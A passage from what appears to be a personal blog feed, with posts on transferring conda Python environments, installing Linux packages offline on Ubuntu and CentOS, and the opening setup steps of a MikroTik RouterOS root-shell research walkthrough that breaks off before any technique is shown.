&lt;p&gt;Have you ever needed to transfer isolated Python environments from one machine to another but were unsure of the best way to do it? Fret not, stranger—I have you covered!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://mathscantor.github.io/posts/transferring-python-packages/images/sumikko-penguin-nerd-loop.gif&#34; alt=&#34;sumikko-penguin-nerd-loop&#34;&gt;&lt;/p&gt;
&lt;p&gt;If you are unfamiliar with Python environments, they are basically a self-contained directory that has its own python binary, along with other python packages.
This means that if you accidentally install a conflicting package in that Python environment, you can simply delete the entire folder and start again, hassle-free.
If you were to face conflicting python packages on the base environment, things could get extremely messy.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Have you ever needed to transfer isolated Python environments from one machine to another but were unsure of the best way to do it? Fret not, stranger—I have you covered!</p>
<p><img src="/posts/transferring-python-packages/images/sumikko-penguin-nerd-loop.gif" alt="sumikko-penguin-nerd-loop"></p>
<p>If you are unfamiliar with Python environments, they are basically a self-contained directory that has its own python binary, along with other python packages.
This means that if you accidentally install a conflicting package in that Python environment, you can simply delete the entire folder and start again, hassle-free.
If you were to face conflicting python packages on the base environment, things could get extremely messy.</p>
<p>I would highly recommend using <em>miniconda</em> for managing python environments. I have been a long-term user of <em>miniconda</em> and it beats the <em>venv</em> python environment manager when it comes to the transference of packages from one machine to another.</p>
<p>This guide will show you how to:</p>
<ul>
<li>Install <em>miniconda</em></li>
<li>Create python environments with the <code>conda</code> command</li>
<li>Install python packages into the environment</li>
<li>Transfer python environments with the <code>conda</code> command</li>
</ul>
<link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert important">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Important</strong>
        </div>
        <div class="alert-body"><ul>
<li>Before we proceed, is is also important to know the target machine&rsquo;s processor architecture and OS version.</li>
<li>Sections 2 to 5.1 have to be done on a similar machine to the target machine.</li>
<li>If the preperation machine is too different from the target machine, the transfer will fail!</li>
</ul>
</div>
    </div>
</div>

<h2 id="2-installing-miniconda">2. Installing Miniconda</h2>
<h3 id="21-windows">2.1 Windows</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\gerald&gt; curl https<span style="color:#960050;background-color:#1e0010">:</span>//repo.anaconda.com/miniconda/Miniconda3-latest-Windows-x86_64.exe -o miniconda.exe
</span></span><span style="display:flex;"><span>PS C:\Users\gerald&gt; Start-Process -FilePath <span style="color:#e6db74">&#34;.\miniconda.exe&#34;</span> -ArgumentList <span style="color:#e6db74">&#34;/S&#34;</span> -Wait
</span></span><span style="display:flex;"><span>PS C:\Users\gerald&gt; del miniconda.exe
</span></span></code></pre></div><p>After installation, open the “Anaconda Powershell Prompt (miniconda3)”.</p>
<h3 id="22-linux">2.2 Linux</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@nexus:~$ mkdir -p ~/miniconda3
</span></span><span style="display:flex;"><span>gerald@nexus:~$ wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O ~/miniconda3/miniconda.sh
</span></span><span style="display:flex;"><span>gerald@nexus:~$ bash ~/miniconda3/miniconda.sh -b -u -p ~/miniconda3
</span></span><span style="display:flex;"><span>gerald@nexus:~$ rm ~/miniconda3/miniconda.sh
</span></span></code></pre></div><p>After installing, close and reopen your terminal application or refresh it by running the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@nexus:~$ source ~/miniconda3/bin/activate
</span></span></code></pre></div><p>To initialize conda on all available shells, run the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@nexus:~$ conda init --all
</span></span></code></pre></div><h2 id="3-creating-python-environments-with-conda">3. Creating Python Environments with Conda</h2>
<p>Once you have a working setup, you should be able to see that there is a <code>(base)</code> environment in your terminal.
The two figures below are for Windows and Linux, respectively.</p>
<p><img src="/posts/transferring-python-packages/images/miniconda_powershell.png" alt="alt text"></p>
<p><img src="/posts/transferring-python-packages/images/miniconda_bash.png" alt="alt text"></p>
<p>To create a new environment with basic python packages, do the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>base<span style="color:#f92672">)</span> gerald@nexus:~$ conda create -n $ENVIRONMENT_NAME python<span style="color:#f92672">=</span>$PYTHON_VERSION
</span></span></code></pre></div><h2 id="4-install-python-packages-in-environment">4. Install Python Packages in Environment</h2>
<p>The following example assumes that I have created an environment called test-env. Do note
that the Linux and Windows conda syntax is exactly the same.</p>
<ol>
<li>
<p>Activate the environment</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>base<span style="color:#f92672">)</span> gerald@nexus:~$ conda activate test-env
</span></span></code></pre></div></li>
<li>
<p><strong>IMPORTANT</strong> - Install conda-pack</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>test-env<span style="color:#f92672">)</span> gerald@nexus:~$ conda install conda-pack
</span></span></code></pre></div></li>
<li>
<p>Install whichever python package you need with <em>pip3</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>test-env<span style="color:#f92672">)</span> gerald@nexus:~$ pip3 install $PYTHON_PACKAGE
</span></span></code></pre></div></li>
</ol>
<h2 id="5-transferring-python-environments-with-conda">5. Transferring Python Environments with Conda</h2>
<h3 id="51-packing-the-environment">5.1 Packing the Environment</h3>
<p>While the environment is still activated, run the following command to archive this environment:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>test-env<span style="color:#f92672">)</span> gerald@nexus:~$ conda-pack
</span></span></code></pre></div><p>On success, this should give you a <code>.tar.gz</code> archive of the environment.</p>
<h3 id="52-unpacking-environment-on-target-machine">5.2 Unpacking Environment on Target Machine</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@target:~$ mkdir test-env
</span></span><span style="display:flex;"><span>user@target:~$ tar -xzf test-env.tar.gz -C test-env
</span></span><span style="display:flex;"><span>user@target:~$ source test-env/bin/activate
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>test-env<span style="color:#f92672">)</span> user@target:~$ conda-unpack
</span></span></code></pre></div><p>If everything has been done properly up to this stage, you will have a working python environment with all your packages in your target machine.</p>
<h2 id="6-conclusion">6. Conclusion</h2>
<p>I have been using this workaround for quite some time now and while doing this write-up, I realized that conda has a new feature where you can specify the target platform when creating a new environment. The example shown in their official documentation is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ conda create --platform osx-64 --name python-x64 python
</span></span></code></pre></div><p>I have yet to test this new feature out. Perhaps I will do a follow-up post soon to explore this new workflow.
Adios for now!</p>
<h2 id="7-references">7. References</h2>
<ol>
<li><a href="https://docs.anaconda.com/miniconda/install/">https://docs.anaconda.com/miniconda/install/</a></li>
<li><a href="https://docs.conda.io/projects/conda/en/latest/user-guide/tasks/manage-environments.html">https://docs.conda.io/projects/conda/en/latest/user-guide/tasks/manage-environments.html</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>Installing Linux Packages Offline</title>
            <link>https://mathscantor.github.io/posts/installing-packages-offline/</link>
            <pubDate>Sun, 05 Jan 2025 11:45:27 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/installing-packages-offline/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Hi there 😊. Another day, another post. Today, I thought it would be useful to share some tips and tricks when installing new software on a standalone linux machine / VM.&lt;/p&gt;
&lt;p&gt;For cybersecurity researchers that have to adhere to company policy to disconnect research machines from the internet, this post will be useful for your future workflows.&lt;/p&gt;
&lt;p&gt;Before I begin the walkthrough, it is important to have 1 internet-connected machine that is of a similar OS Version to the offline machine so as to minimize incompatibilities between systems.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Hi there 😊. Another day, another post. Today, I thought it would be useful to share some tips and tricks when installing new software on a standalone linux machine / VM.</p>
<p>For cybersecurity researchers that have to adhere to company policy to disconnect research machines from the internet, this post will be useful for your future workflows.</p>
<p>Before I begin the walkthrough, it is important to have 1 internet-connected machine that is of a similar OS Version to the offline machine so as to minimize incompatibilities between systems.</p>
<p>For now, this post will only be going through the steps to install packages offline for Ubuntu and CentOS machines. In the future, I may revist and update this post again if I find more workarounds.</p>
<h2 id="2-ubuntu">2. Ubuntu</h2>
<h3 id="21-editing-apt-source">2.1 Editing Apt Source</h3>
<p>The first thing you want to do is to edit /etc/apt/sources.list and uncomment the lines that start with <code>deb-src</code>.</p>
<p>Once you are done, your /etc/apt/sources.list should look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>base<span style="color:#f92672">)</span> gerald@nexus:~$ cat /etc/apt/sources.list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#deb cdrom:[Ubuntu 22.04.1 LTS _Jammy Jellyfish_ - Release amd64 (20220809.1)]/ jammy main restricted</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># newer versions of the distribution.</span>
</span></span><span style="display:flex;"><span>deb http://sg.archive.ubuntu.com/ubuntu/ jammy main restricted
</span></span><span style="display:flex;"><span>deb-src http://sg.archive.ubuntu.com/ubuntu/ jammy main restricted
</span></span><span style="display:flex;"><span>....
</span></span></code></pre></div><link href="/posts/css/alert.css" rel="stylesheet">
<div class="alert tip">
    <div class="alert-content">
        <div class="alert-header">
            <span class="alert-icon"></span>
            <strong class="alert-title">Tip</strong>
        </div>
        <div class="alert-body">Depending on the Ubuntu version you are using, the distro name will be different. In my case, my Ubuntu internet-connected machine is 22.04, and hence mine is jammy.</div>
    </div>
</div>

<h3 id="22-downloading-main-package-with-dependencies">2.2 Downloading Main Package with Dependencies</h3>
<ol>
<li>
<p>Make a new directory to save your packages</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@internet-connected:~$ mkdir $HOME/Downloads/xfer
</span></span></code></pre></div></li>
<li>
<p>Change directory</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@internet-connected:~$ cd $HOME/Downloads/xfer
</span></span></code></pre></div></li>
<li>
<p>Download package with its dependencies</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@internet-connected:~/Downloads/xfer$ apt-get download <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">$(</span>apt-cache depends --recurse --no-recommends <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--no-suggests --no-conflicts --no-breaks <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--no-replaces --no-enhances <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>$PACKAGE_NAME | grep <span style="color:#e6db74">&#34;^\w&#34;</span><span style="color:#66d9ef">)</span>
</span></span></code></pre></div></li>
</ol>
<h3 id="23-transfer-and-install-on-offline-machine">2.3 Transfer and Install on Offline Machine</h3>
<p>Now that you have the main package with its dependencies, use whichever method you prefer to transfer these packages over to the offline machine.</p>
<p>Then, just run the following command to install all packages. Do not that this is an extremely lazy way of doing things and it does not regard the order in which the packages should be installed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@standalone:~/Downloads/xfer$ sudo dpkg -i *.deb
</span></span></code></pre></div><p>If the above command does not install everything the first time due to the wrong order of dependencies being installed, just run it a few more times until you see that there&rsquo;s no error. It&rsquo;s abit stupid&hellip;I know. But if it works, it works.</p>
<p><img src="/posts/installing-packages-offline/images/sumikko-gurashi-penguin-throw-book.gif" alt="sumikko-gurashi-penguin-throw-book"></p>
<h3 id="24--bonus----extracting-libraries-and-binaries">2.4 ⭐ BONUS -  Extracting Libraries and Binaries</h3>
<p>Assuming you just want some libraries from the <code>.deb</code> package, you can make use of <code>dpkg-deb</code> extraction.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># SYSROOT_PATH refers to the directory to extract to.</span>
</span></span><span style="display:flex;"><span>$ dpkg-deb -x $PACKAGE_NAME.deb $SYSROOT_PATH
</span></span></code></pre></div><p>Here&rsquo;s also a one liner to extract all <code>.deb</code> packages in the same directory for the lazy people out there like myself.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ DEBS<span style="color:#f92672">=(</span><span style="color:#66d9ef">$(</span>ls | grep <span style="color:#e6db74">&#34;.deb&#34;</span><span style="color:#66d9ef">)</span><span style="color:#f92672">)</span>; <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">for</span> package in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>DEBS[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">do</span> dpkg-deb -x $package $SYSROOT_PATH; <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><h2 id="3-centos">3. CentOS</h2>
<p>If your CentOS Version has reached EOL (End of Life), you will need to update the remote yum repository URLs. Otherwise, you can skip the steps in sub section 3.1.</p>
<h3 id="31-editing-yum-source">3.1 Editing Yum Source</h3>
<p>For CentOS Versions that have reached EOL, you may find all archived packages in the following 2 URLs:</p>
<ol>
<li><a href="https://vault.centos.org/">https://vault.centos.org/</a></li>
<li><a href="https://archive.kernel.org/centos-vault/">https://archive.kernel.org/centos-vault/</a></li>
</ol>
<p>For this example, I used CentOS 8.5.2111 which has already reached EOL.</p>
<p>For the following 3 repository lists, comment out <code>mirrorlist</code>, and edit the <code>baseurl</code> accordingly:</p>
<ol>
<li>
<p>Edit /etc/yum.repos.d/CentOS-Linux-AppStream.repo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[appstream]</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">CentOS Linux $releasever - AppStream</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=AppStream&amp;infra=$infra</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">baseurl</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://archive.kernel.org/centos-vault/8.5.2111/AppStream/$basearch/os/</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span></code></pre></div></li>
<li>
<p>Edit /etc/yum.repos.d/CentOS-Linux-BaseOS.repo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[baseos]</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">CentOS Linux $releasever - BaseOS</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=BaseOS&amp;infra=$infra</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">baseurl</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://archive.kernel.org/centos-vault/8.5.2111/BaseOS/$basearch/os/</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span></code></pre></div></li>
<li>
<p>Edit /etc/yum.repos.d/CentOS-Linux-Extras.repo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">[extras]</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">CentOS Linux $releasever - Extras</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">baseurl</span><span style="color:#f92672">=</span><span style="color:#e6db74">http://archive.kernel.org/centos-vault/8.5.2111/extras/$basearch/os/</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span></code></pre></div></li>
</ol>
<p>Once you are done, do a <code>dnf update</code> / <code>yum update</code> to check that the remote reposiotry is working properly.</p>
<h3 id="32-downloading-main-package-with-dependencies">3.2 Downloading Main Package with Dependencies</h3>
<p>You can use either <code>dnf</code> or <code>yum</code> to download your packages.</p>
<h4 id="321-using-dnf">3.2.1 Using dnf</h4>
<ol>
<li>Install dnf-plugins-core (if not already installed)
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>user@internet-connected ~<span style="color:#f92672">]</span>$ sudo dnf install dnf-plugins-core
</span></span></code></pre></div></li>
<li>Download the package together with its dependencies
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>user@internet-connected ~<span style="color:#f92672">]</span>$ dnf download --resolve <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--destdir $HOME/Downloads/xfer <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>$PACKAGE_NAME
</span></span></code></pre></div></li>
</ol>
<h4 id="322-using-yum">3.2.2 Using yum</h4>
<ol>
<li>Install yum-utils (if not already installed)
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>user@internet-connected ~<span style="color:#f92672">]</span>$ sudo yum install yum-utils
</span></span></code></pre></div></li>
<li>Download the package together with its dependencies
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>user@internet-connected ~<span style="color:#f92672">]</span>$ yumdownloader --resolve <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--destdir $HOME/Downloads/xfer <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>$PACKAGE_NAME
</span></span></code></pre></div></li>
</ol>
<h3 id="33-transfer-and-install-on-offline-machine">3.3 Transfer and Install on Offline Machine</h3>
<p>You can use either <code>dnf</code> or <code>yum</code> to install your packages.</p>
<h4 id="331-using-dnf">3.3.1 Using dnf</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>user@standalone ~<span style="color:#f92672">]</span>$ sudo dnf localinstall *.rpm
</span></span></code></pre></div><h4 id="332-using-yum">3.3.2 Using yum</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>user@standalone ~<span style="color:#f92672">]</span>$ sudo yum localinstall *.rpm
</span></span></code></pre></div><h3 id="34--bonus----extracting-libraries-and-binaries">3.4 ⭐ BONUS -  Extracting Libraries and Binaries</h3>
<p>Assuming you just want some libraries from the <code>.rpm</code> package, you can make use of
<code>rpm2cpio</code> and <code>cpio</code> for extraction.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># SYSROOT_PATH refers to the directory to extract to.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>user@localhost ~<span style="color:#f92672">]</span>$ rpm2cpio $PACKAGE_NAME.rpm <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| <span style="color:#f92672">(</span>cd $SYSROOT_PATH <span style="color:#f92672">&amp;&amp;</span> cpio -idmv<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Here&rsquo;s also a one liner to extract all <code>.rpm</code> packages in the same directory for the lazy people out there like myself.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ RPMS<span style="color:#f92672">=(</span><span style="color:#66d9ef">$(</span>ls | grep <span style="color:#e6db74">&#34;.rpm&#34;</span><span style="color:#66d9ef">)</span><span style="color:#f92672">)</span>; <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">for</span> package in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>RPMS[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">do</span> rpm2cpio $package <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>| <span style="color:#f92672">(</span>cd $SYSROOT_PATH <span style="color:#f92672">&amp;&amp;</span> cpio -idmv<span style="color:#f92672">)</span>; <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><h2 id="4-conclusion">4. Conclusion</h2>
<p>If you have made it this far, congratulations!
<img src="/posts/installing-packages-offline/images/sumikko-gurashi-party-popper.gif" alt="sumikko-gurashi"></p>
<p>I hope you learnt something useful today and if this works like a charm for you, you are always welcome to come back to reference these set of instructions for your future use. Cheers and have a nice day!</p>
]]></content>
        </item>
        
        <item>
            <title>Getting Root Shell Mikrotik RouterOS</title>
            <link>https://mathscantor.github.io/posts/getting-root-shell-mikrotik-routeros/</link>
            <pubDate>Fri, 03 Jan 2025 20:26:00 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/getting-root-shell-mikrotik-routeros/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;I was digging through some of the stuff I did previously several years ago and I thought that this technique may come in handy one day for researchers doing Vulnerability Research on Mikrotik RouterOS systems.&lt;/p&gt;
&lt;p&gt;For those that have already done their hands-on spinning up a Mikrotik RouterOS with the default installation on a VM, you will quickly realize that you are restricted to only using the MikroTik Command Line Interface. In other words, no bash 🙁.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>I was digging through some of the stuff I did previously several years ago and I thought that this technique may come in handy one day for researchers doing Vulnerability Research on Mikrotik RouterOS systems.</p>
<p>For those that have already done their hands-on spinning up a Mikrotik RouterOS with the default installation on a VM, you will quickly realize that you are restricted to only using the MikroTik Command Line Interface. In other words, no bash 🙁.</p>
<p>This walkthrough will show a step-by-step process to break out of &ldquo;jail&rdquo;.</p>
<h2 id="2-walkthrough">2. Walkthrough</h2>
<p>Subsection 2.1 shows how to set up the VM.</p>
<p>Subsections 2.2 to 2.4 shows how the jailbreak was discovered.</p>
<p>If you are only interested in the steps to jailbreak, please follow from subsections 2.5 onwards.
Do also note that the walkthrough is based on a older version of Mikrotik RouterOS - 6.42.11.</p>
<h3 id="21-getting-started">2.1 Getting Started</h3>
<p>Firstly, we need to get the ISO file of interest from the official <a href="https://mikrotik.com/download/archive"><strong>mikrotik archives</strong></a>.</p>
<p>Spin up a VM using any hypervisor of your choosing. I would personally recommend using VMWare as it is now free for personal use. However, if you are doing research on a commercial network, please make sure you have a commercial license activated if not you may get yourself into hot water.</p>
<p>To start the installation of the Mikrotik RouterOS, create a new virtual machine from the ISO file and when selecting a guest operating system, choose <em>Other &ndash;&gt; Other</em>.
<img src="/posts/getting-root-shell-mikrotik-routeros/images/vmware-guest-operating-system.png" alt="vmware-guest-operating-system"></p>
<p>Follow the instructions of the installation, and on success you will be prompted to login. By default the administrator username is &lsquo;admin&rsquo; with no password.</p>
<p>If everything is okay up till this point, you will be able to see the RouterOS CLI.</p>
<p><img src="/posts/getting-root-shell-mikrotik-routeros/images/mikrotik-admin-shell.png" alt="mikrotik-admin-shell"></p>
<p>After logging in as admin, we need to assign an IP address to our VM. For this example, I have assigned 172.16.205.150/24 as my RouterOS IP. Please change the values according to your own setup.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>admin@MikroTik &gt; /ip address add address<span style="color:#f92672">=</span>172.16.205.150/24 interface<span style="color:#f92672">=</span>ether1<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>After wards, do a simple ping test from your host to see if it is reachable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ping 172.16.205.150
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PING 172.16.205.150 <span style="color:#f92672">(</span>172.16.205.150<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.16.205.150: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>37.5 ms
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.16.205.150: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.709 ms
